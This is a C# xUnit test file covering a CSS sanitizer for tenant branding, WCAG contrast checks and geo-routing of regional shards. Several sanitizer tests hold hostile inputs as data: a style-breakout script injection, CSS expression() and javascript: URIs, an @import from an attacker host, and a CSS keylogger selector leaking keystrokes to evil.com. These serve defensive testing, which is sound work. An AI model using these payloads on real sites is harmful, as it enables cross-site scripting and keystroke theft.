using FluentAssertions;
using SGrowing.Api.Modules.Tenancy.Governance;
using SGrowing.Api.Modules.Tenancy.MultiRegion;
using Xunit;

namespace SGrowing.Tests.Tenancy;

public class BrandingGovernanceAndGeoRoutingTests
{
    private readonly MultiTenantBrandingGovernanceService _governanceService = new();
    private readonly GeoRoutingMeshService _geoService = new();

    #region 1. MultiTenantBrandingGovernanceService Tests

    [Fact]
    public void ScanAndSanitizeCss_NullOrEmptyContent_ReturnsCleanResult()
    {
        var nullResult = _governanceService.ScanAndSanitizeCss(null);
        var emptyResult = _governanceService.ScanAndSanitizeCss("   ");

        nullResult.IsClean.Should().BeTrue();
        nullResult.DetectedThreats.Should().BeEmpty();
        nullResult.SanitizedCss.Should().BeEmpty();

        emptyResult.IsClean.Should().BeTrue();
        emptyResult.DetectedThreats.Should().BeEmpty();
        emptyResult.SanitizedCss.Should().BeEmpty();
    }

    [Fact]
    public void ScanAndSanitizeCss_CleanStandardCss_RemainsUnchanged()
    {
        var validCss = ".btn-primary { background-color: #4F46E5; color: #FFFFFF; border-radius: 8px; font-weight: 600; }";
        var result = _governanceService.ScanAndSanitizeCss(validCss);

        result.IsClean.Should().BeTrue();
        result.DetectedThreats.Should().BeEmpty();
        result.SanitizedCss.Should().Be(validCss);
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsHtmlTagInjection_AndRemovesTag()
    {
        var maliciousCss = ".banner { color: red; } </style><script>alert('xss')</script><style>";
        var result = _governanceService.ScanAndSanitizeCss(maliciousCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "HtmlTagInjection" && t.Severity == ThreatSeverity.Critical);
        result.SanitizedCss.Should().NotContain("<script>");
        result.SanitizedCss.Should().NotContain("</style>");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsExpressionAndJavascriptUri_AndRemovesThem()
    {
        var maliciousCss = ".exploit { width: expression(alert(1)); background-image: url('javascript:alert(2)'); }";
        var result = _governanceService.ScanAndSanitizeCss(maliciousCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "ExpressionExecution");
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "ScriptPseudoProtocol");
        result.SanitizedCss.Should().NotContain("expression(");
        result.SanitizedCss.Should().NotContain("javascript:");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsAtImportAndExternalUrls()
    {
        var maliciousCss = "@import url('https://attacker.com/evil.css'); .hero { background: url('https://cdn.malicious.com/tracker.png'); }";
        var result = _governanceService.ScanAndSanitizeCss(maliciousCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "MaliciousImport");
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "ExternalUrlExfiltration");
        result.SanitizedCss.Should().NotContain("@import");
        result.SanitizedCss.Should().NotContain("https://attacker.com");
    }

    [Fact]
    public void ScanAndSanitizeCss_DetectsCssKeyloggerPattern()
    {
        var keyloggerCss = "input[value^='a'] { background-image: url('https://evil.com/leak?k=a'); }";
        var result = _governanceService.ScanAndSanitizeCss(keyloggerCss);

        result.IsClean.Should().BeFalse();
        result.DetectedThreats.Should().Contain(t => t.ThreatType == "CssKeylogger" && t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void LuminanceAndContrast_BlackAndWhite_ComputesExpectedRatios()
    {
        var whiteLum = _governanceService.CalculateRelativeLuminance("#FFFFFF");
        var blackLum = _governanceService.CalculateRelativeLuminance("#000000");

        whiteLum.Should().BeApproximately(1.0, 0.01);
        blackLum.Should().BeApproximately(0.0, 0.01);

        var contrast = _governanceService.CalculateContrastRatio("#000000", "#FFFFFF");
        contrast.Should().BeApproximately(21.0, 0.1);

        var sameColorContrast = _governanceService.CalculateContrastRatio("#FFFFFF", "#FFFFFF");
        sameColorContrast.Should().BeApproximately(1.0, 0.01);
    }

    [Fact]
    public void EvaluateContrast_PassingAndFailingColors_AccuratelyEvaluatesWcagStandards()
    {
        // High contrast (black on white)
        var highResult = _governanceService.EvaluateContrast("#000000", "#FFFFFF");
        highResult.PassesAaNormal.Should().BeTrue();
        highResult.PassesAaLarge.Should().BeTrue();
        highResult.PassesAaaNormal.Should().BeTrue();
        highResult.PassesAaaLarge.Should().BeTrue();

        // Low contrast (light gray on white)
        var lowResult = _governanceService.EvaluateContrast("#CCCCCC", "#FFFFFF");
        lowResult.PassesAaNormal.Should().BeFalse();
        lowResult.PassesAaaNormal.Should().BeFalse();
        lowResult.RecommendedAdjustedColor.Should().NotBeNullOrWhiteSpace();
        lowResult.AdjustedContrastRatio.Should().BeGreaterThanOrEqualTo(4.5);
    }

    #endregion

    #region 2. GeoRoutingMeshService Tests

    [Fact]
    public void GetAllShards_ReturnsConfiguredDefaultShards()
    {
        var shards = _geoService.GetAllShards();

        shards.Should().HaveCount(3);
        shards.Should().Contain(s => s.Region == RegionIdentifier.AfNorth1 && s.IsActive);
        shards.Should().Contain(s => s.Region == RegionIdentifier.EuWest3 && s.IsActive);
        shards.Should().Contain(s => s.Region == RegionIdentifier.MeCentral1 && s.IsActive);
    }

    [Theory]
    [InlineData("DZ", RegionIdentifier.AfNorth1)]
    [InlineData("TN", RegionIdentifier.AfNorth1)]
    [InlineData("MA", RegionIdentifier.AfNorth1)]
    [InlineData("FR", RegionIdentifier.EuWest3)]
    [InlineData("DE", RegionIdentifier.EuWest3)]
    [InlineData("GB", RegionIdentifier.EuWest3)]
    [InlineData("AE", RegionIdentifier.MeCentral1)]
    [InlineData("SA", RegionIdentifier.MeCentral1)]
    [InlineData("UNKNOWN_XX", RegionIdentifier.AfNorth1)]
    public void ResolveCountryToNearestRegion_MapsToExpectedRegion(string countryCode, RegionIdentifier expectedRegion)
    {
        var region = _geoService.ResolveCountryToNearestRegion(countryCode);
        region.Should().Be(expectedRegion);
    }

    [Fact]
    public void CalculateHaversineDistanceKm_ComputesAccurateSphericalDistance()
    {
        // Distance between Algiers (36.7538 N, 3.0588 E) and Paris (48.8566 N, 2.3522 E) is ~1348 km
        var distanceKm = _geoService.CalculateHaversineDistanceKm(
            GeoRoutingMeshService.AlgiersLatitude, GeoRoutingMeshService.AlgiersLongitude,
            GeoRoutingMeshService.ParisLatitude, GeoRoutingMeshService.ParisLongitude);

        distanceKm.Should().BeInRange(1340.0, 1360.0);
    }

    [Fact]
    public void UpdateShardStatus_ModifiesHealthAndLatency()
    {
        var shardId = "shard-af-north-1-pri";
        _geoService.UpdateShardStatus(shardId, isActive: false, healthState: ShardHealthState.Degraded, latencyScoreMs: 145.0);

        var shard = _geoService.GetShard(shardId);
        shard.Should().NotBeNull();
        shard!.IsActive.Should().BeFalse();
        shard.HealthState.Should().Be(ShardHealthState.Degraded);
        shard.LatencyScoreMs.Should().Be(145.0);

        // Reset to default
        _geoService.ResetShardStatusToDefaults();
        var resetShard = _geoService.GetShard(shardId);
        resetShard!.IsActive.Should().BeTrue();
        resetShard.HealthState.Should().Be(ShardHealthState.Healthy);
    }

    #endregion
}
